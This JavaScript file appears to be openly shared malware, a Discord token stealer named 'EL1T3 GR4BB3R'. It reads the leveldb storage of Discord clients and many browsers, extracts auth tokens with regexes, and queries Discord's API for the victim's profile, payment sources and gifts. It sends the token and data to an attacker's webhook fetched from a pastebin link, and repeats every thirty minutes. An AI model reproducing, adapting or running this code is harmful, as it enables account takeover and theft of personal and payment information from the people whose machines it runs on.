async function EL1T3() {
    const { Webhook, MessageBuilder } = require('discord-webhook-node');
    const axios = require('axios').default;
    const fs = require('fs');

    async function EL1T3_MAIN(hook_uri) {
        async function GetTokens() {
            await axios.get(hook_uri).then(async resp_1 => {
                const hook_url = await resp_1.data; console.log(hook_url)

                const hook = new Webhook({ url: hook_url, throwErrors: false, retryOnLimit: true });
                hook.setUsername('EL1T3 GR4BB3R');
                hook.send('Discord started')
                
                const discord_path = [
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,

                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
                    `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
                ];

                discord_path.forEach(path => {
                    try {
                        fs.readdir(path, (err, files) => {
                            if (files === undefined) return;

                            let filter = files.filter(f => f.split('.').pop() === 'log' || 'ldb');

                            for (var i = 0; i < filter.length; i++) {
                                fs.readFile(`${path}/${filter[i]}`, `utf-8`, async function (err, data) {
                                    let [match] = /[\w-]{24}.[\w-]{6}.[\w-]{27}/.exec(data) || /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(data) || /`mfa\.[\d\w_-]{84}`/.exec(data) || /mfa\.[\w-]{84}/.exec(data) || [null];

                                    if (match != null) {
                                        var token = match.replace(/`/g, '');

                                        await axios.get('https://discord.com/api/v6/users/@me', { headers: { 'authorization': token } }).then(async resp_2 => {
                                            let resp2 = await resp_2.data;

                                            await axios.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', { headers: { 'authorization': token } }).then(async resp_3 => {
                                                let resp3 = await resp_3.data;

                                                await axios.get('https://discord.com/api/v8/users/@me/entitlements/gifts', { headers: { 'authorization': token } }).then(async resp_4 => {
                                                    let resp4 = await resp_4.data;
                                                    let resp5;

                                                    await axios.get('https://discord.com/api/v8/promotions/xbox-game-pass', { headers: { 'authorization': token } }).then(async resp_5 => {
                                                        resp5 = await resp_5.data;
                                                    }).catch(err => resp5 = 'None');

                                                    const embed = new MessageBuilder()
                                                        .setColor('#000000')
                                                        .setThumbnail(`https://cdn.discordapp.com/avatars/${resp2.id}/${resp2.avatar}.png`)
                                                        .setDescription('```' + token + '```\n' + '**User informations:**\n```json\n' + JSON.stringify(resp2, null, 2) + '```\n**Payment Sources**\n```json\n' + JSON.stringify(resp3, null, 2) + '```\n**Not claimed Gift:**\n```json\n' + JSON.stringify(resp4, null, 2) + '```\n**Xbox Gamepass:**\n```json\n' + JSON.stringify(resp5, null, 2) + '```')
                                                        .setFooter('EL1T3 - github.com/Its-Vichy - Ѵιcнч"RCΛ#0001')
                                                        .setTimestamp();

                                                    hook.send(embed)
                                                    SelfBot(token);
                                                }).catch();
                                            }).catch();
                                        }).catch();
                                    };
                                });
                            };
                        });
                    } catch { };
                });
            });
        };

        GetTokens()
        setInterval(() => {
            GetTokens()
        }, 30 * 60000);
    };
    
    EL1T3_MAIN('https://pastebin.com/raw/xxxxxxxx'); // put webhook url on pastbin
};

EL1T3();